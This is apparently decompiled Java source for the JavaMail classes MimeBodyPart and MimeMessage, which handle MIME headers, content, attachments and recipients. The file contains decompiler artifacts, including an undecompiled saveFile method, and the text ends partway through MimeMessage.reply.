package javax.mail.internet;

import com.sun.mail.util.ASCIIUtility;
import com.sun.mail.util.FolderClosedIOException;
import com.sun.mail.util.LineOutputStream;
import com.sun.mail.util.MessageRemovedIOException;
import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.util.Enumeration;
import java.util.Vector;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.FolderClosedException;
import javax.mail.Message;
import javax.mail.MessageRemovedException;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.Part;
import javax.mail.internet.HeaderTokenizer.Token;

public class MimeBodyPart extends BodyPart implements MimePart {
    static boolean cacheMultipart;
    private static boolean decodeFileName;
    private static boolean encodeFileName;
    private static boolean setContentTypeFileName;
    private static boolean setDefaultTextCharset;
    private Object cachedContent;
    protected byte[] content;
    protected InputStream contentStream;
    protected DataHandler dh;
    protected InternetHeaders headers;

    static {
        boolean z = false;
        setDefaultTextCharset = true;
        setContentTypeFileName = true;
        encodeFileName = false;
        decodeFileName = false;
        cacheMultipart = true;
        try {
            String s = System.getProperty("mail.mime.setdefaulttextcharset");
            boolean z2 = s == null || !s.equalsIgnoreCase("false");
            setDefaultTextCharset = z2;
            s = System.getProperty("mail.mime.setcontenttypefilename");
            if (s == null || !s.equalsIgnoreCase("false")) {
                z2 = true;
            } else {
                z2 = false;
            }
            setContentTypeFileName = z2;
            s = System.getProperty("mail.mime.encodefilename");
            if (s == null || s.equalsIgnoreCase("false")) {
                z2 = false;
            } else {
                z2 = true;
            }
            encodeFileName = z2;
            s = System.getProperty("mail.mime.decodefilename");
            if (s == null || s.equalsIgnoreCase("false")) {
                z2 = false;
            } else {
                z2 = true;
            }
            decodeFileName = z2;
            s = System.getProperty("mail.mime.cachemultipart");
            if (s == null || !s.equalsIgnoreCase("false")) {
                z = true;
            }
            cacheMultipart = z;
        } catch (SecurityException e) {
        }
    }

    public MimeBodyPart() {
        this.headers = new InternetHeaders();
    }

    public MimeBodyPart(InputStream is) throws MessagingException {
        if (!((is instanceof ByteArrayInputStream) || (is instanceof BufferedInputStream) || (is instanceof SharedInputStream))) {
            is = new BufferedInputStream(is);
        }
        this.headers = new InternetHeaders(is);
        if (is instanceof SharedInputStream) {
            SharedInputStream sis = (SharedInputStream) is;
            this.contentStream = sis.newStream(sis.getPosition(), -1);
            return;
        }
        try {
            this.content = ASCIIUtility.getBytes(is);
        } catch (IOException ioex) {
            throw new MessagingException("Error reading input stream", ioex);
        }
    }

    public MimeBodyPart(InternetHeaders headers, byte[] content) throws MessagingException {
        this.headers = headers;
        this.content = content;
    }

    public int getSize() throws MessagingException {
        if (this.content != null) {
            return this.content.length;
        }
        if (this.contentStream != null) {
            try {
                int size = this.contentStream.available();
                if (size > 0) {
                    return size;
                }
            } catch (IOException e) {
            }
        }
        return -1;
    }

    public int getLineCount() throws MessagingException {
        return -1;
    }

    public String getContentType() throws MessagingException {
        String s = getHeader("Content-Type", null);
        if (s == null) {
            return "text/plain";
        }
        return s;
    }

    public boolean isMimeType(String mimeType) throws MessagingException {
        return isMimeType(this, mimeType);
    }

    public String getDisposition() throws MessagingException {
        return getDisposition(this);
    }

    public void setDisposition(String disposition) throws MessagingException {
        setDisposition(this, disposition);
    }

    public String getEncoding() throws MessagingException {
        return getEncoding(this);
    }

    public String getContentID() throws MessagingException {
        return getHeader("Content-Id", null);
    }

    public void setContentID(String cid) throws MessagingException {
        if (cid == null) {
            removeHeader("Content-ID");
        } else {
            setHeader("Content-ID", cid);
        }
    }

    public String getContentMD5() throws MessagingException {
        return getHeader("Content-MD5", null);
    }

    public void setContentMD5(String md5) throws MessagingException {
        setHeader("Content-MD5", md5);
    }

    public String[] getContentLanguage() throws MessagingException {
        return getContentLanguage(this);
    }

    public void setContentLanguage(String[] languages) throws MessagingException {
        setContentLanguage(this, languages);
    }

    public String getDescription() throws MessagingException {
        return getDescription(this);
    }

    public void setDescription(String description) throws MessagingException {
        setDescription(description, null);
    }

    public void setDescription(String description, String charset) throws MessagingException {
        setDescription(this, description, charset);
    }

    public String getFileName() throws MessagingException {
        return getFileName(this);
    }

    public void setFileName(String filename) throws MessagingException {
        setFileName(this, filename);
    }

    public InputStream getInputStream() throws IOException, MessagingException {
        return getDataHandler().getInputStream();
    }

    /* access modifiers changed from: protected */
    public InputStream getContentStream() throws MessagingException {
        if (this.contentStream != null) {
            return ((SharedInputStream) this.contentStream).newStream(0, -1);
        }
        if (this.content != null) {
            return new ByteArrayInputStream(this.content);
        }
        throw new MessagingException("No content");
    }

    public InputStream getRawInputStream() throws MessagingException {
        return getContentStream();
    }

    public DataHandler getDataHandler() throws MessagingException {
        if (this.dh == null) {
            this.dh = new DataHandler(new MimePartDataSource(this));
        }
        return this.dh;
    }

    public Object getContent() throws IOException, MessagingException {
        if (this.cachedContent != null) {
            return this.cachedContent;
        }
        try {
            Object c = getDataHandler().getContent();
            if (!cacheMultipart) {
                return c;
            }
            if (!(c instanceof Multipart) && !(c instanceof Message)) {
                return c;
            }
            if (this.content == null && this.contentStream == null) {
                return c;
            }
            this.cachedContent = c;
            return c;
        } catch (FolderClosedIOException fex) {
            throw new FolderClosedException(fex.getFolder(), fex.getMessage());
        } catch (MessageRemovedIOException mex) {
            throw new MessageRemovedException(mex.getMessage());
        }
    }

    public void setDataHandler(DataHandler dh) throws MessagingException {
        this.dh = dh;
        this.cachedContent = null;
        invalidateContentHeaders(this);
    }

    public void setContent(Object o, String type) throws MessagingException {
        if (o instanceof Multipart) {
            setContent((Multipart) o);
        } else {
            setDataHandler(new DataHandler(o, type));
        }
    }

    public void setText(String text) throws MessagingException {
        setText(text, null);
    }

    public void setText(String text, String charset) throws MessagingException {
        setText(this, text, charset, "plain");
    }

    public void setText(String text, String charset, String subtype) throws MessagingException {
        setText(this, text, charset, subtype);
    }

    public void setContent(Multipart mp) throws MessagingException {
        setDataHandler(new DataHandler(mp, mp.getContentType()));
        mp.setParent(this);
    }

    public void attachFile(File file) throws IOException, MessagingException {
        DataSource fds = new FileDataSource(file);
        setDataHandler(new DataHandler(fds));
        setFileName(fds.getName());
    }

    public void attachFile(String file) throws IOException, MessagingException {
        attachFile(new File(file));
    }

    /* JADX WARNING: Removed duplicated region for block: B:20:0x002e A:{SYNTHETIC, Splitter:B:20:0x002e} */
    /* JADX WARNING: Removed duplicated region for block: B:23:0x0033 A:{SYNTHETIC, Splitter:B:23:0x0033} */
    public void saveFile(java.io.File r8) throws java.io.IOException, javax.mail.MessagingException {
        /*
        r7 = this;
        r3 = 0;
        r1 = 0;
        r4 = new java.io.BufferedOutputStream;	 Catch:{ all -> 0x003f }
        r5 = new java.io.FileOutputStream;	 Catch:{ all -> 0x003f }
        r5.<init>(r8);	 Catch:{ all -> 0x003f }
        r4.<init>(r5);	 Catch:{ all -> 0x003f }
        r1 = r7.getInputStream();	 Catch:{ all -> 0x002a }
        r5 = 8192; // 0x2000 float:1.14794E-41 double:4.0474E-320;
        r0 = new byte[r5];	 Catch:{ all -> 0x002a }
    L_0x0014:
        r2 = r1.read(r0);	 Catch:{ all -> 0x002a }
        if (r2 > 0) goto L_0x0025;
    L_0x001a:
        if (r1 == 0) goto L_0x001f;
    L_0x001c:
        r1.close();	 Catch:{ IOException -> 0x003b }
    L_0x001f:
        if (r4 == 0) goto L_0x0024;
    L_0x0021:
        r4.close();	 Catch:{ IOException -> 0x003d }
    L_0x0024:
        return;
    L_0x0025:
        r5 = 0;
        r4.write(r0, r5, r2);	 Catch:{ all -> 0x002a }
        goto L_0x0014;
    L_0x002a:
        r5 = move-exception;
        r3 = r4;
    L_0x002c:
        if (r1 == 0) goto L_0x0031;
    L_0x002e:
        r1.close();	 Catch:{ IOException -> 0x0037 }
    L_0x0031:
        if (r3 == 0) goto L_0x0036;
    L_0x0033:
        r3.close();	 Catch:{ IOException -> 0x0039 }
    L_0x0036:
        throw r5;
    L_0x0037:
        r6 = move-exception;
        goto L_0x0031;
    L_0x0039:
        r6 = move-exception;
        goto L_0x0036;
    L_0x003b:
        r5 = move-exception;
        goto L_0x001f;
    L_0x003d:
        r5 = move-exception;
        goto L_0x0024;
    L_0x003f:
        r5 = move-exception;
        goto L_0x002c;
        */
        throw new UnsupportedOperationException("Method not decompiled: javax.mail.internet.MimeBodyPart.saveFile(java.io.File):void");
    }

    public void saveFile(String file) throws IOException, MessagingException {
        saveFile(new File(file));
    }

    public void writeTo(OutputStream os) throws IOException, MessagingException {
        writeTo(this, os, null);
    }

    public String[] getHeader(String name) throws MessagingException {
        return this.headers.getHeader(name);
    }

    public String getHeader(String name, String delimiter) throws MessagingException {
        return this.headers.getHeader(name, delimiter);
    }

    public void setHeader(String name, String value) throws MessagingException {
        this.headers.setHeader(name, value);
    }

    public void addHeader(String name, String value) throws MessagingException {
        this.headers.addHeader(name, value);
    }

    public void removeHeader(String name) throws MessagingException {
        this.headers.removeHeader(name);
    }

    public Enumeration getAllHeaders() throws MessagingException {
        return this.headers.getAllHeaders();
    }

    public Enumeration getMatchingHeaders(String[] names) throws MessagingException {
        return this.headers.getMatchingHeaders(names);
    }

    public Enumeration getNonMatchingHeaders(String[] names) throws MessagingException {
        return this.headers.getNonMatchingHeaders(names);
    }

    public void addHeaderLine(String line) throws MessagingException {
        this.headers.addHeaderLine(line);
    }

    public Enumeration getAllHeaderLines() throws MessagingException {
        return this.headers.getAllHeaderLines();
    }

    public Enumeration getMatchingHeaderLines(String[] names) throws MessagingException {
        return this.headers.getMatchingHeaderLines(names);
    }

    public Enumeration getNonMatchingHeaderLines(String[] names) throws MessagingException {
        return this.headers.getNonMatchingHeaderLines(names);
    }

    /* access modifiers changed from: protected */
    public void updateHeaders() throws MessagingException {
        updateHeaders(this);
        if (this.cachedContent != null) {
            this.dh = new DataHandler(this.cachedContent, getContentType());
            this.cachedContent = null;
            this.content = null;
            if (this.contentStream != null) {
                try {
                    this.contentStream.close();
                } catch (IOException e) {
                }
            }
            this.contentStream = null;
        }
    }

    static boolean isMimeType(MimePart part, String mimeType) throws MessagingException {
        try {
            return new ContentType(part.getContentType()).match(mimeType);
        } catch (ParseException e) {
            return part.getContentType().equalsIgnoreCase(mimeType);
        }
    }

    static void setText(MimePart part, String text, String charset, String subtype) throws MessagingException {
        if (charset == null) {
            if (MimeUtility.checkAscii(text) != 1) {
                charset = MimeUtility.getDefaultMIMECharset();
            } else {
                charset = "us-ascii";
            }
        }
        part.setContent(text, "text/" + subtype + "; charset=" + MimeUtility.quote(charset, HeaderTokenizer.MIME));
    }

    static String getDisposition(MimePart part) throws MessagingException {
        String s = part.getHeader("Content-Disposition", null);
        if (s == null) {
            return null;
        }
        return new ContentDisposition(s).getDisposition();
    }

    static void setDisposition(MimePart part, String disposition) throws MessagingException {
        if (disposition == null) {
            part.removeHeader("Content-Disposition");
            return;
        }
        String s = part.getHeader("Content-Disposition", null);
        if (s != null) {
            ContentDisposition cd = new ContentDisposition(s);
            cd.setDisposition(disposition);
            disposition = cd.toString();
        }
        part.setHeader("Content-Disposition", disposition);
    }

    static String getDescription(MimePart part) throws MessagingException {
        String rawvalue = part.getHeader("Content-Description", null);
        if (rawvalue == null) {
            return null;
        }
        try {
            return MimeUtility.decodeText(MimeUtility.unfold(rawvalue));
        } catch (UnsupportedEncodingException e) {
            return rawvalue;
        }
    }

    static void setDescription(MimePart part, String description, String charset) throws MessagingException {
        if (description == null) {
            part.removeHeader("Content-Description");
            return;
        }
        try {
            part.setHeader("Content-Description", MimeUtility.fold(21, MimeUtility.encodeText(description, charset, null)));
        } catch (UnsupportedEncodingException uex) {
            throw new MessagingException("Encoding error", uex);
        }
    }

    static String getFileName(MimePart part) throws MessagingException {
        String filename = null;
        String s = part.getHeader("Content-Disposition", null);
        if (s != null) {
            filename = new ContentDisposition(s).getParameter("filename");
        }
        if (filename == null) {
            s = part.getHeader("Content-Type", null);
            if (s != null) {
                try {
                    filename = new ContentType(s).getParameter("name");
                } catch (ParseException e) {
                }
            }
        }
        if (!decodeFileName || filename == null) {
            return filename;
        }
        try {
            return MimeUtility.decodeText(filename);
        } catch (UnsupportedEncodingException ex) {
            throw new MessagingException("Can't decode filename", ex);
        }
    }

    static void setFileName(MimePart part, String name) throws MessagingException {
        String str;
        if (encodeFileName && name != null) {
            try {
                name = MimeUtility.encodeText(name);
            } catch (UnsupportedEncodingException ex) {
                throw new MessagingException("Can't encode filename", ex);
            }
        }
        String s = part.getHeader("Content-Disposition", null);
        if (s == null) {
            str = Part.ATTACHMENT;
        } else {
            str = s;
        }
        ContentDisposition cd = new ContentDisposition(str);
        cd.setParameter("filename", name);
        part.setHeader("Content-Disposition", cd.toString());
        if (setContentTypeFileName) {
            s = part.getHeader("Content-Type", null);
            if (s != null) {
                try {
                    ContentType cType = new ContentType(s);
                    cType.setParameter("name", name);
                    part.setHeader("Content-Type", cType.toString());
                } catch (ParseException e) {
                }
            }
        }
    }

    static String[] getContentLanguage(MimePart part) throws MessagingException {
        String s = part.getHeader("Content-Language", null);
        if (s == null) {
            return null;
        }
        HeaderTokenizer h = new HeaderTokenizer(s, HeaderTokenizer.MIME);
        Vector v = new Vector();
        while (true) {
            Token tk = h.next();
            int tkType = tk.getType();
            if (tkType == -4) {
                break;
            } else if (tkType == -1) {
                v.addElement(tk.getValue());
            }
        }
        if (v.size() == 0) {
            return null;
        }
        String[] language = new String[v.size()];
        v.copyInto(language);
        return language;
    }

    static void setContentLanguage(MimePart part, String[] languages) throws MessagingException {
        StringBuffer sb = new StringBuffer(languages[0]);
        for (int i = 1; i < languages.length; i++) {
            sb.append(',').append(languages[i]);
        }
        part.setHeader("Content-Language", sb.toString());
    }

    static String getEncoding(MimePart part) throws MessagingException {
        String s = part.getHeader("Content-Transfer-Encoding", null);
        if (s == null) {
            return null;
        }
        s = s.trim();
        if (s.equalsIgnoreCase("7bit") || s.equalsIgnoreCase("8bit") || s.equalsIgnoreCase("quoted-printable") || s.equalsIgnoreCase("binary") || s.equalsIgnoreCase("base64")) {
            return s;
        }
        Token tk;
        HeaderTokenizer h = new HeaderTokenizer(s, HeaderTokenizer.MIME);
        int tkType;
        do {
            tk = h.next();
            tkType = tk.getType();
            if (tkType == -4) {
                return s;
            }
        } while (tkType != -1);
        return tk.getValue();
    }

    static void setEncoding(MimePart part, String encoding) throws MessagingException {
        part.setHeader("Content-Transfer-Encoding", encoding);
    }

    static void updateHeaders(MimePart part) throws MessagingException {
        DataHandler dh = part.getDataHandler();
        if (dh != null) {
            try {
                String type = dh.getContentType();
                boolean composite = false;
                boolean needCTHeader = part.getHeader("Content-Type") == null;
                ContentType cType = new ContentType(type);
                if (cType.match("multipart/*")) {
                    Object o;
                    composite = true;
                    if (part instanceof MimeBodyPart) {
                        MimeBodyPart mbp = (MimeBodyPart) part;
                        o = mbp.cachedContent != null ? mbp.cachedContent : dh.getContent();
                    } else if (part instanceof MimeMessage) {
                        MimeMessage msg = (MimeMessage) part;
                        o = msg.cachedContent != null ? msg.cachedContent : dh.getContent();
                    } else {
                        o = dh.getContent();
                    }
                    if (o instanceof MimeMultipart) {
                        ((MimeMultipart) o).updateHeaders();
                    } else {
                        throw new MessagingException("MIME part of type \"" + type + "\" contains object of type " + o.getClass().getName() + " instead of MimeMultipart");
                    }
                } else if (cType.match("message/rfc822")) {
                    composite = true;
                }
                if (!composite) {
                    if (part.getHeader("Content-Transfer-Encoding") == null) {
                        setEncoding(part, MimeUtility.getEncoding(dh));
                    }
                    if (needCTHeader && setDefaultTextCharset && cType.match("text/*") && cType.getParameter("charset") == null) {
                        String charset;
                        String enc = part.getEncoding();
                        if (enc == null || !enc.equalsIgnoreCase("7bit")) {
                            charset = MimeUtility.getDefaultMIMECharset();
                        } else {
                            charset = "us-ascii";
                        }
                        cType.setParameter("charset", charset);
                        type = cType.toString();
                    }
                }
                if (needCTHeader) {
                    String s = part.getHeader("Content-Disposition", null);
                    if (s != null) {
                        String filename = new ContentDisposition(s).getParameter("filename");
                        if (filename != null) {
                            cType.setParameter("name", filename);
                            type = cType.toString();
                        }
                    }
                    part.setHeader("Content-Type", type);
                }
            } catch (IOException ex) {
                throw new MessagingException("IOException updating headers", ex);
            }
        }
    }

    static void invalidateContentHeaders(MimePart part) throws MessagingException {
        part.removeHeader("Content-Type");
        part.removeHeader("Content-Transfer-Encoding");
    }

    static void writeTo(MimePart part, OutputStream os, String[] ignoreList) throws IOException, MessagingException {
        LineOutputStream los;
        if (os instanceof LineOutputStream) {
            los = (LineOutputStream) os;
        } else {
            los = new LineOutputStream(os);
        }
        Enumeration hdrLines = part.getNonMatchingHeaderLines(ignoreList);
        while (hdrLines.hasMoreElements()) {
            los.writeln((String) hdrLines.nextElement());
        }
        los.writeln();
        os = MimeUtility.encode(os, part.getEncoding());
        part.getDataHandler().writeTo(os);
        os.flush();
    }
}
package javax.mail.internet;

import com.sun.mail.util.ASCIIUtility;
import com.sun.mail.util.FolderClosedIOException;
import com.sun.mail.util.LineOutputStream;
import com.sun.mail.util.MessageRemovedIOException;
import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectStreamException;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.text.ParseException;
import java.util.Date;
import java.util.Enumeration;
import java.util.Vector;
import javax.activation.DataHandler;
import javax.mail.Address;
import javax.mail.Flags;
import javax.mail.Flags.Flag;
import javax.mail.Folder;
import javax.mail.FolderClosedException;
import javax.mail.Message;
import javax.mail.MessageRemovedException;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.util.SharedByteArrayInputStream;

public class MimeMessage extends Message implements MimePart {
    private static final Flags answeredFlag = new Flags(Flag.ANSWERED);
    private static MailDateFormat mailDateFormat = new MailDateFormat();
    Object cachedContent;
    protected byte[] content;
    protected InputStream contentStream;
    protected DataHandler dh;
    protected Flags flags;
    protected InternetHeaders headers;
    protected boolean modified;
    protected boolean saved;
    private boolean strict;

    public static class RecipientType extends javax.mail.Message.RecipientType {
        public static final RecipientType NEWSGROUPS = new RecipientType("Newsgroups");
        private static final long serialVersionUID = -5468290701714395543L;

        protected RecipientType(String type) {
            super(type);
        }

        /* access modifiers changed from: protected */
        public Object readResolve() throws ObjectStreamException {
            if (this.type.equals("Newsgroups")) {
                return NEWSGROUPS;
            }
            return super.readResolve();
        }
    }

    public MimeMessage(Session session) {
        super(session);
        this.modified = false;
        this.saved = false;
        this.strict = true;
        this.modified = true;
        this.headers = new InternetHeaders();
        this.flags = new Flags();
        initStrict();
    }

    public MimeMessage(Session session, InputStream is) throws MessagingException {
        super(session);
        this.modified = false;
        this.saved = false;
        this.strict = true;
        this.flags = new Flags();
        initStrict();
        parse(is);
        this.saved = true;
    }

    public MimeMessage(MimeMessage source) throws MessagingException {
        ByteArrayOutputStream bos;
        super(source.session);
        this.modified = false;
        this.saved = false;
        this.strict = true;
        this.flags = source.getFlags();
        int size = source.getSize();
        if (size > 0) {
            bos = new ByteArrayOutputStream(size);
        } else {
            bos = new ByteArrayOutputStream();
        }
        try {
            this.strict = source.strict;
            source.writeTo(bos);
            bos.close();
            SharedByteArrayInputStream bis = new SharedByteArrayInputStream(bos.toByteArray());
            parse(bis);
            bis.close();
            this.saved = true;
        } catch (IOException ex) {
            throw new MessagingException("IOException while copying message", ex);
        }
    }

    protected MimeMessage(Folder folder, int msgnum) {
        super(folder, msgnum);
        this.modified = false;
        this.saved = false;
        this.strict = true;
        this.flags = new Flags();
        this.saved = true;
        initStrict();
    }

    protected MimeMessage(Folder folder, InputStream is, int msgnum) throws MessagingException {
        this(folder, msgnum);
        initStrict();
        parse(is);
    }

    protected MimeMessage(Folder folder, InternetHeaders headers, byte[] content, int msgnum) throws MessagingException {
        this(folder, msgnum);
        this.headers = headers;
        this.content = content;
        initStrict();
    }

    private void initStrict() {
        if (this.session != null) {
            String s = this.session.getProperty("mail.mime.address.strict");
            boolean z = s == null || !s.equalsIgnoreCase("false");
            this.strict = z;
        }
    }

    /* access modifiers changed from: protected */
    public void parse(InputStream is) throws MessagingException {
        if (!((is instanceof ByteArrayInputStream) || (is instanceof BufferedInputStream) || (is instanceof SharedInputStream))) {
            is = new BufferedInputStream(is);
        }
        this.headers = createInternetHeaders(is);
        if (is instanceof SharedInputStream) {
            SharedInputStream sis = (SharedInputStream) is;
            this.contentStream = sis.newStream(sis.getPosition(), -1);
        } else {
            try {
                this.content = ASCIIUtility.getBytes(is);
            } catch (IOException ioex) {
                throw new MessagingException("IOException", ioex);
            }
        }
        this.modified = false;
    }

    public Address[] getFrom() throws MessagingException {
        Address[] a = getAddressHeader("From");
        if (a == null) {
            return getAddressHeader("Sender");
        }
        return a;
    }

    public void setFrom(Address address) throws MessagingException {
        if (address == null) {
            removeHeader("From");
        } else {
            setHeader("From", address.toString());
        }
    }

    public void setFrom() throws MessagingException {
        InternetAddress me = InternetAddress.getLocalAddress(this.session);
        if (me != null) {
            setFrom(me);
            return;
        }
        throw new MessagingException("No From address");
    }

    public void addFrom(Address[] addresses) throws MessagingException {
        addAddressHeader("From", addresses);
    }

    public Address getSender() throws MessagingException {
        Address[] a = getAddressHeader("Sender");
        if (a == null || a.length == 0) {
            return null;
        }
        return a[0];
    }

    public void setSender(Address address) throws MessagingException {
        if (address == null) {
            removeHeader("Sender");
        } else {
            setHeader("Sender", address.toString());
        }
    }

    public Address[] getRecipients(javax.mail.Message.RecipientType type) throws MessagingException {
        if (type != RecipientType.NEWSGROUPS) {
            return getAddressHeader(getHeaderName(type));
        }
        String s = getHeader("Newsgroups", ",");
        return s == null ? null : NewsAddress.parse(s);
    }

    public Address[] getAllRecipients() throws MessagingException {
        Address[] all = super.getAllRecipients();
        Address[] ng = getRecipients(RecipientType.NEWSGROUPS);
        if (ng == null) {
            return all;
        }
        if (all == null) {
            return ng;
        }
        Address[] addresses = new Address[(all.length + ng.length)];
        System.arraycopy(all, 0, addresses, 0, all.length);
        System.arraycopy(ng, 0, addresses, all.length, ng.length);
        return addresses;
    }

    public void setRecipients(javax.mail.Message.RecipientType type, Address[] addresses) throws MessagingException {
        if (type != RecipientType.NEWSGROUPS) {
            setAddressHeader(getHeaderName(type), addresses);
        } else if (addresses == null || addresses.length == 0) {
            removeHeader("Newsgroups");
        } else {
            setHeader("Newsgroups", NewsAddress.toString(addresses));
        }
    }

    public void setRecipients(javax.mail.Message.RecipientType type, String addresses) throws MessagingException {
        if (type != RecipientType.NEWSGROUPS) {
            setAddressHeader(getHeaderName(type), InternetAddress.parse(addresses));
        } else if (addresses == null || addresses.length() == 0) {
            removeHeader("Newsgroups");
        } else {
            setHeader("Newsgroups", addresses);
        }
    }

    public void addRecipients(javax.mail.Message.RecipientType type, Address[] addresses) throws MessagingException {
        if (type == RecipientType.NEWSGROUPS) {
            String s = NewsAddress.toString(addresses);
            if (s != null) {
                addHeader("Newsgroups", s);
                return;
            }
            return;
        }
        addAddressHeader(getHeaderName(type), addresses);
    }

    public void addRecipients(javax.mail.Message.RecipientType type, String addresses) throws MessagingException {
        if (type != RecipientType.NEWSGROUPS) {
            addAddressHeader(getHeaderName(type), InternetAddress.parse(addresses));
        } else if (addresses != null && addresses.length() != 0) {
            addHeader("Newsgroups", addresses);
        }
    }

    public Address[] getReplyTo() throws MessagingException {
        Address[] a = getAddressHeader("Reply-To");
        if (a == null) {
            return getFrom();
        }
        return a;
    }

    public void setReplyTo(Address[] addresses) throws MessagingException {
        setAddressHeader("Reply-To", addresses);
    }

    private Address[] getAddressHeader(String name) throws MessagingException {
        String s = getHeader(name, ",");
        return s == null ? null : InternetAddress.parseHeader(s, this.strict);
    }

    private void setAddressHeader(String name, Address[] addresses) throws MessagingException {
        String s = InternetAddress.toString(addresses);
        if (s == null) {
            removeHeader(name);
        } else {
            setHeader(name, s);
        }
    }

    private void addAddressHeader(String name, Address[] addresses) throws MessagingException {
        String s = InternetAddress.toString(addresses);
        if (s != null) {
            addHeader(name, s);
        }
    }

    public String getSubject() throws MessagingException {
        String rawvalue = getHeader("Subject", null);
        if (rawvalue == null) {
            return null;
        }
        try {
            return MimeUtility.decodeText(MimeUtility.unfold(rawvalue));
        } catch (UnsupportedEncodingException e) {
            return rawvalue;
        }
    }

    public void setSubject(String subject) throws MessagingException {
        setSubject(subject, null);
    }

    public void setSubject(String subject, String charset) throws MessagingException {
        if (subject == null) {
            removeHeader("Subject");
            return;
        }
        try {
            setHeader("Subject", MimeUtility.fold(9, MimeUtility.encodeText(subject, charset, null)));
        } catch (UnsupportedEncodingException uex) {
            throw new MessagingException("Encoding error", uex);
        }
    }

    public Date getSentDate() throws MessagingException {
        String s = getHeader("Date", null);
        if (s == null) {
            return null;
        }
        try {
            Date parse;
            synchronized (mailDateFormat) {
                parse = mailDateFormat.parse(s);
            }
            return parse;
        } catch (ParseException e) {
            return null;
        }
    }

    public void setSentDate(Date d) throws MessagingException {
        if (d == null) {
            removeHeader("Date");
            return;
        }
        synchronized (mailDateFormat) {
            setHeader("Date", mailDateFormat.format(d));
        }
    }

    public Date getReceivedDate() throws MessagingException {
        return null;
    }

    public int getSize() throws MessagingException {
        if (this.content != null) {
            return this.content.length;
        }
        if (this.contentStream != null) {
            try {
                int size = this.contentStream.available();
                if (size > 0) {
                    return size;
                }
            } catch (IOException e) {
            }
        }
        return -1;
    }

    public int getLineCount() throws MessagingException {
        return -1;
    }

    public String getContentType() throws MessagingException {
        String s = getHeader("Content-Type", null);
        if (s == null) {
            return "text/plain";
        }
        return s;
    }

    public boolean isMimeType(String mimeType) throws MessagingException {
        return MimeBodyPart.isMimeType(this, mimeType);
    }

    public String getDisposition() throws MessagingException {
        return MimeBodyPart.getDisposition(this);
    }

    public void setDisposition(String disposition) throws MessagingException {
        MimeBodyPart.setDisposition(this, disposition);
    }

    public String getEncoding() throws MessagingException {
        return MimeBodyPart.getEncoding(this);
    }

    public String getContentID() throws MessagingException {
        return getHeader("Content-Id", null);
    }

    public void setContentID(String cid) throws MessagingException {
        if (cid == null) {
            removeHeader("Content-ID");
        } else {
            setHeader("Content-ID", cid);
        }
    }

    public String getContentMD5() throws MessagingException {
        return getHeader("Content-MD5", null);
    }

    public void setContentMD5(String md5) throws MessagingException {
        setHeader("Content-MD5", md5);
    }

    public String getDescription() throws MessagingException {
        return MimeBodyPart.getDescription(this);
    }

    public void setDescription(String description) throws MessagingException {
        setDescription(description, null);
    }

    public void setDescription(String description, String charset) throws MessagingException {
        MimeBodyPart.setDescription(this, description, charset);
    }

    public String[] getContentLanguage() throws MessagingException {
        return MimeBodyPart.getContentLanguage(this);
    }

    public void setContentLanguage(String[] languages) throws MessagingException {
        MimeBodyPart.setContentLanguage(this, languages);
    }

    public String getMessageID() throws MessagingException {
        return getHeader("Message-ID", null);
    }

    public String getFileName() throws MessagingException {
        return MimeBodyPart.getFileName(this);
    }

    public void setFileName(String filename) throws MessagingException {
        MimeBodyPart.setFileName(this, filename);
    }

    private String getHeaderName(javax.mail.Message.RecipientType type) throws MessagingException {
        if (type == javax.mail.Message.RecipientType.TO) {
            return "To";
        }
        if (type == javax.mail.Message.RecipientType.CC) {
            return "Cc";
        }
        if (type == javax.mail.Message.RecipientType.BCC) {
            return "Bcc";
        }
        if (type == RecipientType.NEWSGROUPS) {
            return "Newsgroups";
        }
        throw new MessagingException("Invalid Recipient Type");
    }

    public InputStream getInputStream() throws IOException, MessagingException {
        return getDataHandler().getInputStream();
    }

    /* access modifiers changed from: protected */
    public InputStream getContentStream() throws MessagingException {
        if (this.contentStream != null) {
            return ((SharedInputStream) this.contentStream).newStream(0, -1);
        }
        if (this.content != null) {
            return new SharedByteArrayInputStream(this.content);
        }
        throw new MessagingException("No content");
    }

    public InputStream getRawInputStream() throws MessagingException {
        return getContentStream();
    }

    public synchronized DataHandler getDataHandler() throws MessagingException {
        if (this.dh == null) {
            this.dh = new DataHandler(new MimePartDataSource(this));
        }
        return this.dh;
    }

    public Object getContent() throws IOException, MessagingException {
        if (this.cachedContent != null) {
            return this.cachedContent;
        }
        try {
            Object c = getDataHandler().getContent();
            if (!MimeBodyPart.cacheMultipart) {
                return c;
            }
            if (!(c instanceof Multipart) && !(c instanceof Message)) {
                return c;
            }
            if (this.content == null && this.contentStream == null) {
                return c;
            }
            this.cachedContent = c;
            return c;
        } catch (FolderClosedIOException fex) {
            throw new FolderClosedException(fex.getFolder(), fex.getMessage());
        } catch (MessageRemovedIOException mex) {
            throw new MessageRemovedException(mex.getMessage());
        }
    }

    public synchronized void setDataHandler(DataHandler dh) throws MessagingException {
        this.dh = dh;
        this.cachedContent = null;
        MimeBodyPart.invalidateContentHeaders(this);
    }

    public void setContent(Object o, String type) throws MessagingException {
        if (o instanceof Multipart) {
            setContent((Multipart) o);
        } else {
            setDataHandler(new DataHandler(o, type));
        }
    }

    public void setText(String text) throws MessagingException {
        setText(text, null);
    }

    public void setText(String text, String charset) throws MessagingException {
        MimeBodyPart.setText(this, text, charset, "plain");
    }

    public void setText(String text, String charset, String subtype) throws MessagingException {
        MimeBodyPart.setText(this, text, charset, subtype);
    }

    public void setContent(Multipart mp) throws MessagingException {
        setDataHandler(new DataHandler(mp, mp.getContentType()));
        mp.setParent(this);
    }

    public Message reply(boolean replyToAll) throws MessagingException {
        MimeMessage reply = createMimeMessage(this.session);
        String subject = getHeader("Subject", null);
        if (subject != null) {
            if (!subject.regionMatches(true, 0, "Re: ", 0, 4)) {
                subject = "Re: " + subject;
            }
            reply.setHeader("Subject", subject);
        }
        Address[] a = getReplyTo();
        reply.setRecipients(javax.mail.Message.RecipientType.TO, a);
